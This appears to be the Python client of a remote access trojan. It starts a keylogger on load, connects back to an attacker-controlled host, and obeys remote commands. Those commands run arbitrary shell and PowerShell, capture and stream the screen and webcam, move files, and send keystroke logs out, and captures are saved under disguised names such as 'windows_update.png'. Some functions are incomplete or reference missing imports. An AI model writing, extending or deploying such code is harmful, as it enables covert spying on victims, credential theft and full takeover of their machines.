import socket
import subprocess
from time import sleep
import os
from PIL import ImageGrab
import cv2
from numpy import array
import threading
import pickle
from module import kizagan_key
from sys import _MEIPASS


key = kizagan_key.kizagan_key()
key_thread = threading.Thread(target=key.start_key)
key_thread.start()



class Client():
    def __init__(self):
        connection = socket.socket()
        connection.connect((ip, port))
        
        self.connection = connection
        if os.name == "nt":
            self.ss_path = os.environ["appdata"] + "\\windows_service.png"
            self.cam_path = os.environ["appdata"] + "\\windows_update.png"
        else:
            self.ss_path = "/tmp/linux_service.png"
            self.cam_path = "/tmp/linux_update.png"
        self.key_path = key.key_file
    def execute_powershell(self, command):
        try:
            # Execute PowerShell command and capture output
            process = subprocess.Popen(["powershell", "-Command", command],
                                       stdout=subprocess.PIPE,
                                       stderr=subprocess.PIPE,
                                       stdin=subprocess.PIPE,
                                       text=True)
            stdout, stderr = process.communicate()
            if stderr:
                return f"Error: {stderr}"
            return stdout
        except Exception as e:
            return f"Error: {str(e)}"

    def handle_commands(self):
        while True:
            try:
                command = self.connection.recv(1024).decode()
                if command == "exit":
                    break
                elif command.startswith("powershell "):
                    # Execute PowerShell command
                    ps_command = command[len("powershell "):]
                    output = self.execute_powershell(ps_command)
                    self.connection.send(output.encode())
                else:
                    self.connection.send("Unknown command".encode())
            except Exception as e:
                self.connection.send(f"Error: {str(e)}".encode())
    def download_file(self, file, operation=None):
        if operation == None:
            file_ = open(file, "rb")
            file_size = len(file_.read())
            file_.close()
            file_ = open(file, "rb")
            self.connection.send(str(file_size).encode())
            sleep(1)
            file_content = file_.read(1024)
            while file_content:
                self.connection.send(file_content)
                file_content = file_.read(1024)
            file_.close()
        elif operation == "cam stream":
            img = pickle.dumps(file)
            img_size = len(img)
            self.connection.send(str(img_size).encode())
            size_output = self.connection.recv(1024).decode()
            if size_output == "get_size":
                self.connection.send(img)
                img_output = self.connection.recv(1024).decode()
                if not img_output == "get_img":
                    return "cam_finish"
                else:
                    return "cam_continue"
            else:
                return "cam_finish"
        elif operation == "screen stream":
            frame = pickle.dumps(file)
            frame_size = len(frame)
            self.connection.send(str(frame_size).encode())
            size_output = self.connection.recv(1024).decode()
            if size_output == "get_size":
                self.connection.send(frame)
                frame_output = self.connection.recv(1024).decode()
                if not frame_output == "get_frame":
                    return "screen_finish"
                else:
                    return "screen_continue"
            else:
                return "screen_finish"
        
    def upload_file(self, file_path):
        try:
            if not os.path.isfile(file_path):
                print("File does not exist.")
                self.connection.send("upload_error".encode())
                return

            file_size = os.path.getsize(file_path)
            with open(file_path, "rb") as file_:
                self.connection.send(str(file_size).encode())
                self.connection.recv(1024).decode()  # Wait for client to confirm

                file_content = file_.read(1024)
                while file_content:
                    self.connection.send(file_content)
                    file_content = file_.read(1024)

            print(f"File {file_path} uploaded successfully.")
        except Exception as e:
            print(f"Error during file upload: {e}")
            self.connection.send("upload_error".encode())



    def screenshot(self):
        try:
            ss = ImageGrab.grab()
            ss.save(self.ss_path)
            self.connection.send("ss_success".encode())
        except:
            self.connection.send("ss_error".encode())
            return 0
        try:
            self.download_file(self.ss_path)
            os.remove(self.ss_path)
        except:
            self.connection.send("download_error".encode())

    def screen_stream(self):
        while True:
            try:
                frame = ImageGrab.grab()
                frame = frame.resize((854, 480))
                frame = cv2.cvtColor(array(frame), cv2.COLOR_RGB2BGR)
                screen_output = self.download_file(frame, "screen stream")
                if screen_output == "screen_finish":
                    return 0
            except:
                self.connection.send("screen_error".encode())
        
    def get_cam_list(self, platform):
        if platform == "nt":
            cam_list = "Available Camera Index\n----------------------\n"
            devices = FilterGraph().get_input_devices()
            for device_index, device_name in enumerate(devices):
                cam_list = cam_list + f"CAMERA INDEX:[{device_index}]\t{device_name}\n"
            self.connection.send(cam_list.encode())
        else:
            index = 0
            i = 10
            cam_list = "Available Camera Index\n----------------------\n"
            while i > 0:
                cam = cv2.VideoCapture(index)
                if cam.read()[0]:
                    cam_list = cam_list + f"CAMERA_INDEX:[{index}]\n"
                    cam.release()
                index += 1
                i -= 1
            self.connection.send(cam_list.encode())

    def cam_snapshot(self, cam_index):
        camera = cv2.VideoCapture(cam_index)
        result, image = camera.read()
        if result:
            cv2.imwrite(self.cam_path, image)
            camera.release()
            self.connection.send("camera_success".encode())
            try:
                self.download_file(self.cam_path)
                os.remove(self.cam_path)
            except:
                self.connection.send("download_error".encode())
        else:
            self.connection.send("camera_error".encode())

    def cam_stream(self, cam_index): # ata aranacak.
        camera = cv2.VideoCapture(cam_index)
        while True:
            result, frame = camera.read()
            if result:
                cam_output = self.download_file(frame, "cam stream")
                if cam_output == "cam_finish":
                    camera.release()
                    return 0
            else:
                self.connection.send("camera_error".encode())

    def get_microphone_list(self):
        mic_list = "Available Microphone Index\n----------------------\n"
        for index, device in enumerate(PvRecorder.get_available_devices()):
            mic_list =  mic_list + f"MICROPHONE INDEX:[{index}]\t{device}\n"
        self.connection.send(mic_list.encode())

    def rec_mic(self, mic_index):
        recorder = PvRecorder(frame_length=512, device_index=mic_index)
        recorder.start()
        while recorder.is_recording:
            frame = recorder.read()

    def get_key(self):
        try:
            key_file = open(self.key_path, "r")
            key_file.close()
            self.connection.send("key_success".encode())
        except:
            self.connection.send("key_error".encode())
            return 0
        try:
            sleep(1)
            self.download_file(self.key_path)
            os.remove(self.key_path)
        except:
            self.connection.send("download_error".encode())
            
    def shell(self):
        self.connection.send((os.getcwd()).encode())
        while True:
            shell_command = self.connection.recv(1024).decode()
            splitted_shell_command = shell_command.split(" ")
            if shell_command == "exit":
                return 0
            elif splitted_shell_command[0] == "cd" and len(splitted_shell_command) > 1:
                try:
                    os.chdir(splitted_shell_command[1])
                    self.connection.send(f"cd_success:cd_delimiter:{os.getcwd()}".encode())
                except:
                    self.connection.send("cd_error".encode())
            elif shell_command == "pwd":
                try:
                    pwd = os.getcwd()
                    self.connection.send(pwd.encode())
                except:
                    self.connection.send("pwd_error".encode())
            elif splitted_shell_command[0] == "mkdir" and len(splitted_shell_command) > 1:
                try:
                    os.mkdir(splitted_shell_command[1])
                    self.connection.send("mkdir_success".encode())
                except:
                    self.connection.send("mkdir_error".encode())
            elif splitted_shell_command[0] == "rmdir" and len(splitted_shell_command) > 1:
                try:
                    os.rmdir(splitted_shell_command[1])
                    self.connection.send("rmdir_success".encode())
                except:
                    self.connection.send("rmdir_error".encode())
            elif splitted_shell_command[0] == "rm" and len(splitted_shell_command) > 1:
                try:
                    os.remove(splitted_shell_command[1])
                    self.connection.send("rm_success".encode())
                except:
                    self.connection.send("rm_error".encode())
            elif splitted_shell_command[0] == "rename" and len(splitted_shell_command) > 2:
                try:
                    os.rename(splitted_shell_command[1], splitted_shell_command[2])
                    self.connection.send("rename_success".encode())
                except:
                    self.connection.send("rename_error".encode())
            elif splitted_shell_command[0] == "download" and len(splitted_shell_command) > 1:
                try:
                    self.download_file(splitted_shell_command[1])
                except:
                    self.connection.send("download_error".encode())
            elif splitted_shell_command[0] == "upload" and len(splitted_shell_command) > 1:
                if len(splitted_shell_command) > 2:
                # Client provides both file path and save path
                    file_path = splitted_shell_command[1]
                    save_path = splitted_shell_command[2]
                else:
                # Client provides only file path; default save path to file name
                    file_path = splitted_shell_command[1]
                    save_path = os.path.basename(file_path)

            # Inform client to start the upload
                    self.connection.send(f"upload {file_path} {save_path}".encode())
                    upload_output = self.upload_file(file_path, save_path)
                    print(upload_output)
            else:
                try:
                    shell_command_output = subprocess.check_output(shell_command, shell=True, encoding="Latin1")
                    shell_command_output_with_length = f"{str(len(shell_command_output))}:shell_delimiter:{shell_command_output}"
                    self.connection.send(shell_command_output_with_length.encode())
                except:
                    self.connection.send("command_execute_error".encode())

    def main(self):
        global key_state
        global key
        while True:
            command = self.connection.recv(1024).decode()
            splitted_command = command.split(" ")
            if command == "shell":
                self.shell()
            elif command =="powershell":
                self.handle_commands()

            elif command == "screen_shot":
                self.screenshot()
            elif command == "screen_stream":
                self.screen_stream()
            elif command == "cam_list":
                self.get_cam_list(os.name)
            elif splitted_command[0] == "cam_snapshot" and len(splitted_command) > 1:
                try:
                    cam_index = int(splitted_command[1])
                    self.cam_snapshot(cam_index)
                except ValueError:
                    self.connection.send("camera_error".encode())
            elif splitted_command[0] == "cam_stream" and len(splitted_command) > 1:
                try:
                    cam_index = int(splitted_command[1])
                    self.cam_stream(cam_index)
                except ValueError:
                    self.connection.send("camera_error".encode())
            elif command == "mic_list":
                self.get_microphone_list()
            elif command == "start_key":
                key = kizagan_key.kizagan_key()
                key_thread = threading.Thread(target=key.start_key)
                key_thread.start()
                key_state = "true"
            elif command == "stop_key":
                key.stop_key()
                key_state = "false"
            elif command == "get_key":
                self.get_key()
            elif command == "exit":
                return 0


def open_merge_file(merge_file):
    merge_file = _MEIPASS + f"\\\{merge_file}"
    subprocess.Popen(merge_file, shell=True)

def try_connection():
    while True:
        try:
            sleep(3)
            Client().main()
        except:
            try_connection()